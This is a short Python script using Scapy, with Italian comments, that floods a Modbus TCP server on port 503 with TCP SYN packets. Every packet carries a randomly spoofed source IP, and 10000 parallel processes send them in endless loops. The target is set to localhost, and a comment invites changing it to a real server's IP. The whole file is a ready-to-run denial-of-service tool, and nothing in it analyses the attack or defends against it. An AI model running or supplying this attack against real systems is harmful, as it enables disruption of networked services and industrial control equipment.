from scapy.all import *
import random
import multiprocessing

# Configura l'IP e la porta del server Modbus target
TARGET_IP = "localhost"  # Cambia con l'IP del server
TARGET_PORT = 503  # Modbus TCP

# Genera un IP casuale per spoofing
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Funzione per inviare SYN Flood
def syn_flood():
    while True:
        src_ip = random_ip()  # IP sorgente falso
        src_port = random.randint(1024, 65535)  # Porta casuale
        packet = IP(src=src_ip, dst=TARGET_IP) / TCP(sport=src_port, dport=TARGET_PORT, flags="S")
        send(packet, verbose=False)

# Numero di processi in parallelo
NUM_PROCESSES = 10000  # Modifica per aumentare l'intensità

print(f"Avviando {NUM_PROCESSES} processi per SYN Flood su {TARGET_IP}:{TARGET_PORT}...")

processes = []
for _ in range(NUM_PROCESSES):
    p = multiprocessing.Process(target=syn_flood)
    p.start()
    processes.append(p)

for p in processes:
    p.join()